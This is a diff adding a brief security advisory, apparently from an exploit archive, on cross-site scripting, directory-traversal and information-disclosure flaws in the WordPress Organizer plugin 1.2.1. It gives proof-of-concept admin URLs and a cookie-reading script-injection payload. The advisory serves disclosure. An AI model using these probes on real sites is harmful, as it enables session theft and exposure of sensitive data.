@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/54039/info
+
+The Organizer plugin for WordPress is prone to the following security vulnerabilities:
+
+1. A cross-site scripting vulnerability.
+2. An information-disclosure vulnerability.
+3. A directory-traversal vulnerability.
+
+Attackers may leverage these issues to steal cookie-based authentication credentials, execute arbitrary script code in the browser, or disclose sensitive information; other attacks are also possible.
+
+Organizer 1.2.1 is vulnerable; other versions may also be affected. 
+
+Directory-traversal vulnerability:
+
+http://www.example.com/wp-admin/wp-admin/admin.php?page=organizer/page/view.php
+
+Cross-site scripting vulnerability:
+
+http://www.example.com/wp-admin/admin.php?page=organizer/page/dir.php
+"><script>alert(document.cookie)</script>
+
+Information-disclosure vulnerability:
+
+http://www.example.com/wp-admin/admin.php?page=organizer/page/users.php
+
